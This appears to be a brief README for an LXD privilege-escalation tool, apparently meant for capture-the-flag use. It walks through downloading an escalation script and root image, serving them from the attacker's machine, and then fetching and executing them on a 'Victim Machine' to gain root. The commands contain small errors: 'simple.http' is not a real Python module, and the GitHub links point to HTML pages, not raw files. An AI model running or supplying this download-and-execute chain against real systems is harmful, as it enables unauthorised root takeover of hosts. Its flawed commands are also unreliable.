#  Instructions

### copy the following command in your Machine

 >  wget "https://github.com/CyberJunnkie/LXDAutoPrivilegeEscalator/blob/master/lxd.sh" && wget "https://github.com/CyberJunnkie/LXDAutoPrivilegeEscalator/blob/master/root.tar.gz"

 > Then serve a http server in the directory where you just installed the above files
 > python3 -m simple.http 80

 > Now on Victim Machine type the following command
 
  #### If you are doing a ctf and connected to the vpn,then type your vpn ip in commands below 
 
 > wget "http://10.x.x.x/lxd.sh" && wget "http://10.x.x.x/root.tar.gz" && chmod +x lxd.sh && ./lxd.sh root.tar.gz

  
 

